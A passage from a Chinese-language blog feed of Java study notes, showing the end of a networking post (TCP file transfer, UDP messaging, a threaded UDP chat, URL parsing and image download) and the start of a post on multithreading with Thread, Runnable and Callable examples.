class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">           <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;hitpt.jpg&quot;</span>);</span><br><span class="line">           <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>()) &#123;</span><br><span class="line">         <span class="comment">//发送文件</span></span><br><span class="line">         <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">         <span class="type">int</span> len;</span><br><span class="line">         <span class="keyword">while</span> ((len = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">         &#125;</span><br><span class="line">         socket.shutdownOutput(); <span class="comment">//表示发送完了</span></span><br><span class="line">         System.out.println(<span class="string">&quot;Sent&quot;</span>);</span><br><span class="line">         <span class="comment">//等待服务端通知接收完毕</span></span><br><span class="line">         <span class="keyword">while</span> ((len = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println(<span class="string">&quot;Server: &quot;</span> + baos);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-TCP/TCPFile.JPG"></p><h1 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h1><h2 id="连续发送消息"><a href="#连续发送消息" class="headerlink" title="连续发送消息"></a>连续发送消息</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPSenderDemo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> (<span class="type">DatagramSocket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(<span class="number">8888</span>);</span><br><span class="line">           <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in))) &#123;</span><br><span class="line">         <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">dataString</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">            <span class="type">byte</span>[] data = dataString.getBytes();</span><br><span class="line">            <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(data, <span class="number">0</span>, data.length, <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">6666</span>));</span><br><span class="line">            socket.send(packet);</span><br><span class="line">            <span class="keyword">if</span> (dataString.equals(<span class="string">&quot;bye&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPReceiverDemo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> (<span class="type">DatagramSocket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(<span class="number">6666</span>)) &#123;</span><br><span class="line">         <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">byte</span>[] container = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(container, <span class="number">0</span>, container.length);</span><br><span class="line">            socket.receive(packet); <span class="comment">//阻塞式接收包裹</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(packet.getData(), <span class="number">0</span>, packet.getLength());</span><br><span class="line">            System.out.println(packet.getSocketAddress() + <span class="string">&quot; --&gt; &quot;</span> + data);</span><br><span class="line">            <span class="keyword">if</span> (data.equals(<span class="string">&quot;bye&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两端平等，无C&#x2F;S概念。</p><p><img src="https://img.lfalive.top/Learn-java-TCP/TestUDP.JPG"></p><h2 id="聊天工具实现"><a href="#聊天工具实现" class="headerlink" title="聊天工具实现"></a>聊天工具实现</h2><p>基于上例，再利用多线程来实现。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TalkSend</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">   <span class="type">DatagramSocket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> String toIP;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> toPort;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">TalkSend</span><span class="params">(String toIP, <span class="type">int</span> fromPort, <span class="type">int</span> toPort)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.toIP = toIP;</span><br><span class="line">      <span class="built_in">this</span>.toPort = toPort;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="built_in">this</span>.socket = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(fromPort);</span><br><span class="line">         <span class="built_in">this</span>.reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line">      &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">dataString</span> <span class="operator">=</span> <span class="built_in">this</span>.reader.readLine();</span><br><span class="line">            <span class="type">byte</span>[] data = dataString.getBytes();</span><br><span class="line">            <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(data, <span class="number">0</span>, data.length, <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="built_in">this</span>.toIP, <span class="built_in">this</span>.toPort));</span><br><span class="line">            socket.send(packet);</span><br><span class="line">            <span class="keyword">if</span> (dataString.equals(<span class="string">&quot;bye&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         reader.close();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">      socket.close();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TalkReceive</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">   <span class="type">DatagramSocket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">TalkReceive</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="built_in">this</span>.socket = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(port);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">         <span class="type">byte</span>[] container = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">         <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(container, <span class="number">0</span>, container.length);</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.socket.receive(packet); <span class="comment">//阻塞式接收包裹</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(packet.getData(), <span class="number">0</span>, packet.getLength());</span><br><span class="line">            System.out.println(packet.getSocketAddress() + <span class="string">&quot; --&gt; &quot;</span> + data);</span><br><span class="line">            <span class="keyword">if</span> (data.equals(<span class="string">&quot;bye&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      socket.close();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设，学生和老师要聊天。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TalkStudent</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">TalkSend</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">6666</span>, <span class="number">8888</span>)).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">TalkReceive</span>(<span class="number">7777</span>)).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TalkTeacher</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">TalkSend</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">5555</span>, <span class="number">7777</span>)).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">TalkReceive</span>(<span class="number">8888</span>)).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意端口间的对应关系即可。</p><p><img src="https://img.lfalive.top/Learn-java-TCP/TestTalk.JPG"></p><h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><p>Uniform Resource Locator，统一资源定位器，定位资源的，定位互联网上的某一个资源。</p><p><code>协议://ip地址:端口：/项目名/资源</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLDemo1</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8080/helloworld/index.jsp?key=123&quot;</span>);</span><br><span class="line">         System.out.println(url.getProtocol());</span><br><span class="line">         System.out.println(url.getHost());</span><br><span class="line">         System.out.println(url.getPort());</span><br><span class="line">         System.out.println(url.getPath());</span><br><span class="line">         System.out.println(url.getFile());</span><br><span class="line">         System.out.println(url.getQuery());</span><br><span class="line">      &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-TCP/URL.JPG"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用URL下载资源</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLDemo2</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://img.lfalive.top/PT/hitpt.JPG&quot;</span>);</span><br><span class="line">         <span class="type">HttpURLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">         <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> urlConnection.getInputStream();</span><br><span class="line">         <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;download.jpg&quot;</span>);</span><br><span class="line">         <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">         <span class="type">int</span> len;</span><br><span class="line">         <span class="keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            fos.write(buffer,<span class="number">0</span>, len);</span><br><span class="line">         &#125;</span><br><span class="line">         fos.close();</span><br><span class="line">         inputStream.close();</span><br><span class="line">         urlConnection.disconnect();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习笔记(2)——多线程</title>
      <link href="/2021/06/24/Learn-java-thread/"/>
      <url>/2021/06/24/Learn-java-thread/</url>
      
        <content type="html"><![CDATA[<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p><a href="https://www.kuangstudy.com/">狂神说java官网</a></p><p><a href="https://www.bilibili.com/video/BV1V4411p7EF">B站视频链接</a></p><h1 id="线程简介"><a href="#线程简介" class="headerlink" title="线程简介"></a>线程简介</h1><p><strong>程序</strong>Precess是指令和数据的有序集合，其本身没有任何运行的含义，是一个静态的概念。</p><p>而<strong>进程</strong>Thread则是执行程序的一次执行过程，它是一个动态的概念。是系统资源分配的单位。</p><p>通常在一个进程中可以包含若干个线程，当然一个进程中至少有一个线程，不然没有存在的意义。<strong>线程是CPU调度和执行的的单位。</strong></p><p>在程序运行时，即使没有自己创建线程，<strong>后台</strong>也会有多个线程，如主线程，gc线程。</p><p><code>main()</code>称之为主线程，为系统的入口，用于执行整个程序。</p><p>在一个进程中，如果开辟了多个线程，线程的运行由调度器安排调度，调度器是与操作系统紧密相关的，先后顺序是<strong>不能人为干预</strong>的。</p><p>对同一份资源操作时，会存在<strong>资源抢夺</strong>的问题，需要加入并发控制。</p><p>线程会带来<strong>额外的开销</strong>，如cpu调度时间，并发控制开销。</p><p>每个线程在自己的<strong>工作内存</strong>交互，内存控制不当会造成数据不一致。</p><h1 id="线程实现"><a href="#线程实现" class="headerlink" title="线程实现"></a>线程实现</h1><h2 id="线程创建"><a href="#线程创建" class="headerlink" title="线程创建"></a>线程创建</h2><h3 id="继承Thread类"><a href="#继承Thread类" class="headerlink" title="继承Thread类"></a>继承Thread类</h3><p>步骤：继承Thread类；重写run()方法；调用start开启线程。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// run方法线程体</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;测试线程---------&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// main线程，主线程</span></span><br><span class="line">        <span class="comment">// 创建一个线程对象</span></span><br><span class="line">        <span class="type">TestThread</span> <span class="variable">testThread1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestThread</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用start方法开启线程</span></span><br><span class="line">        testThread1.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;主线程-----------&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-thread/TestThread.JPG"></p><p>可见两个线程交替运行。注：线程开启并不一定立即执行，由CPU调度执行。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一个多线程下载图片的样例，使用了commons io库。</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestThread2</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String url;<span class="comment">//图片地址</span></span><br><span class="line">    <span class="keyword">private</span> String name;<span class="comment">//文件名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestThread2</span><span class="params">(String url, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.url = url;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">WebDownloader</span> <span class="variable">webDownloader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebDownloader</span>();</span><br><span class="line">        webDownloader.downloader(url, name);</span><br><span class="line">        System.out.println(<span class="string">&quot;下载文件：&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TestThread2</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestThread2</span>(<span class="string">&quot;https://img.lfalive.top/PT/HUDPT.jpg&quot;</span>, <span class="string">&quot;hudpt.jpg&quot;</span>);</span><br><span class="line">        <span class="type">TestThread2</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestThread2</span>(<span class="string">&quot;https://img.lfalive.top/PT/hitpt.JPG&quot;</span>, <span class="string">&quot;hitpt.jpg&quot;</span>);</span><br><span class="line">        <span class="type">TestThread2</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestThread2</span>(<span class="string">&quot;https://img.lfalive.top/PT/byrpt.JPG&quot;</span>, <span class="string">&quot;byrpt.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WebDownloader</span> &#123;</span><br><span class="line">    <span class="comment">//下载方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">downloader</span><span class="params">(String url, String name)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyURLToFile(<span class="keyword">new</span> <span class="title class_">URL</span>(url), <span class="keyword">new</span> <span class="title class_">File</span>(name));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.out.println(<span class="string">&quot;IO异常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-thread/ExtendsThread.JPG"></p><h3 id="实现Runnable接口"><a href="#实现Runnable接口" class="headerlink" title="实现Runnable接口"></a>实现Runnable接口</h3><p>步骤：定义MyRunnable类实现Runnable接口；实现run()方法，编写线程执行体；创建线程对象，调用start()方法启动线程。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestThread3</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// run方法线程体</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;测试线程---------&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// main线程，主线程</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个Runnable接口的实现类对象</span></span><br><span class="line">        <span class="type">TestThread3</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestThread3</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建线程对象,通过线程对象来开启线程</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(t1).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;主线程-----------&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多线程下载图片的样例也可用该方法实现。</p><p>不建议继承Thread类，因为需要避免OOP单继承局限性；建议使用Runnable接口，可以避免单继承局限性，灵活方便，方便同一个对象被多个线程使用，即”将任务和线程完全分离“。</p><h3 id="并发问题"><a href="#并发问题" class="headerlink" title="并发问题"></a>并发问题</h3><p>以售卖火车票为例，多个线程操作同一个资源的情况下，线程不安全，数据紊乱。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//模拟龟兔赛跑（并未考虑兔子的休息），多线程操作同一个资源</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Race</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String winner;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//跑一步</span></span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;---&gt;跑了&quot;</span> + i + <span class="string">&quot;步&quot;</span>);</span><br><span class="line">            <span class="comment">//比赛是否结束</span></span><br><span class="line">            <span class="keyword">if</span> (gameOver(i)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">gameOver</span><span class="params">(<span class="type">int</span> steps)</span> &#123;</span><br><span class="line">        <span class="comment">//已有胜者</span></span><br><span class="line">        <span class="keyword">if</span> (winner != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//到终点</span></span><br><span class="line">        <span class="keyword">if</span> (steps &gt;= <span class="number">100</span>) &#123;</span><br><span class="line">            winner = Thread.currentThread().getName();</span><br><span class="line">            System.out.println(<span class="string">&quot;Winner is &quot;</span> + winner);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Race</span> <span class="variable">race</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Race</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(race, <span class="string">&quot;乌龟&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(race, <span class="string">&quot;兔子&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-thread/Race.JPG"></p><p>winner变量即为公共资源。</p><h3 id="实现Callable接口及线程池"><a href="#实现Callable接口及线程池" class="headerlink" title="实现Callable接口及线程池"></a>实现Callable接口及线程池</h3><p>Callable好处：可以定义返回值，可以抛出异常。线程池参考：</p><ul><li><a href="https://blog.csdn.net/suifeng3051/article/details/49443835">Java线程池 ExecutorService</a></li><li><a href="https://www.cnblogs.com/zhujiabin/p/5404771.html">Java 四种线程池</a></li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用Callable接口实现图片多线程下载</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span 